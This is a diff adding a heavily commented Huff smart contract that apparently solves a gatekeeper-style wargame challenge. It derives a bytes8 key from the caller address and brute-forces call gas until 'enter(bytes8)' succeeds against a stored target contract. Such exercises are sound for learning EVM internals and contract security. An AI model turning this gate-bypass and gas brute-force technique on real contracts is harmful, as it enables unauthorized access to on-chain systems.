@@ -1,0 +1,125 @@
+// Storage 
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
+#define constant GAS_SLOT = FREE_STORAGE_POINTER()
+
+// Constructor
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // Copy caller into OWNER_SLOT in storage
+    caller          // [msg.sender] - msg.sender
+    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
+    sstore          // [] - sstore consumes top 2 stack items. The first item is
+                    // the key (storage location) and the second item is the value (item to store)
+
+    // Copy constructor argument (address) into memory
+    0x20            // [0x20] - This will be the size for the the code we will copy to memory
+    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
+    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
+    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
+    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
+    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)
+
+    // Copy address from memory into INSTANCE_SLOT in storage
+    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
+    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
+    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
+    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
+}
+
+// Modifier
+#define macro ONLY_OWNER() = takes (0) returns (0) {
+    caller          // [caller]
+    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
+    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
+    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
+    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
+    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0
+
+    0x00            // [0x00] - size
+    0x00            // [0x00, 0x00] - byte offset
+    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)
+
+    is_owner:       // is_owner label. execution continues here is the caller is the owner
+}
+
+// Attack function
+#define macro ATTACK() = takes(0) returns (0) {
+    // Compute key
+    0xFFFFFFFF0000FFFF // [mask]
+    caller             // [owner, mask] - msg.sender is owner due to modifier
+    and                // [key_b32] - performs bitwise and on two top items and pushes result. Effectively isolating last 8 bytes
+    0xc0               // [0xc0, key_b32] - # of bits to shift key_b32 left
+    shl                // [key_b8] - converted key from bytes32 to bytes8
+
+    // Copy `enter(bytes8)` and key into memory to use as calldata for call
+    0x3370204e         // [0x3370204e, key_b8] - func sig
+    0x00               // [0x00, 0x3370204e, key_b8] - byte offset
+    mstore             // [key_b8] - copied func sig into memory starting at offset 0x00
+    0x20               // [0x20, key_b8] - byte offset
+    mstore             // [] - copied key_b8 into memory starting at offset 0x20
+
+    // MEMORY:
+    // [OFFSET 0]  000000000000000000000000000000000000000000000000000000003370204e -> `enter(bytes8)` func sig
+    // [OFFSET 32] 11e280e100007a9c000000000000000000000000000000000000000000000000 -> key (bytes8)
+
+    // Copy gas value and instance onto stack to reuse in loop
+    [INSTANCE_SLOT]    // [0x01] - storage slot where instance is
+    sload              // [instance] - copied instance onto stack
+    0x01               // [0x01, instance] - i
+    0x1ffe             // [gas_val, 0x01, instance] - 8190
+    
+    // Loop
+    loop:
+        // Increment gas value. Starting loop with gas value = 8191
+        dup2               // [0x01, gas_val, 0x01, instance]
+        add                // [[1 + gas_val], 0x01, instance]
+
+        // CALL into instance
+        0x00               // [0x00, gas_val, 0x01, instance] - size of return data
+        0x00               // [0x00, 0x00, gas_val, 0x01, instance] - byte offset in memory where return data is copied
+        0x24               // [0x24, 0x00, 0x00, gas_val, 0x01, instance] - size of calldata
+        0x1c               // [0x1c, 0x24, 0x00, 0x00, gas_val, 0x01, instance] - byte offset in memory where calldata starts
+        0x00               // [0x00, 0x1c, 0x24, 0x00, 0x00, gas_val, 0x01, instance] - msg.value to send with call (none)
+        dup8               // [instance, 0x00, 0x1c, 0x24, 0x00, 0x00, gas_val, 0x01, instance] - calling instance
+        dup7               // [gas, instance, 0x00, 0x1c, 0x24, 0x00, 0x00, gas_val, 0x01, instance] - gas to send with call
+        call               // [success, gas_val, 0x01, instance] - consumes 7 items off stack and returns 1 if did not revert, 0 otherwise
+        iszero             // [0/1, gas_val, 0x01, instance]
+        loop               // [loop, 0/1, gas_val, 0x01, instance]
+        jumpi              // [gas_val, 0x01, instance]
+    
+    // Copy gas value to memory to return 
+    0x00                   // [0x00, gas_val, 0x01, instance] - byte offset
+    mstore                 // [gas_val, 0x01, instance] - copied gas value into memory starting at offset 0x00
+
+    // MEMORY:
+    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000000060fd -> gas
+    // [OFFSET 32] 11e280e100007a9c000000000000000000000000000000000000000000000000 -> key (bytes8)
+    
+    // Return gas value and key
+    msize                  // [0x40, gas_val, 0x01, instance] - active memory size. Size of data to return
+    0x00                   // [0x00, 0x40, gas_val, 0x01, instance] - byte offset for start of data to return
+    return                 // [gas_val, 0x01, instance]
+}
+
+// Function Dispatching
+#define macro MAIN() = takes (0) returns (0) {
+    // Identify which function is being called
+    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
+    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
+    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
+    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
+                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)
+
+    dup1         // [func_sig, func_sig]
+    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+    
+    // Fallback
+    0x00 0x00 revert
+
+    attack:      // label for attack instructions
+        ONLY_OWNER()
+        ATTACK()
+}
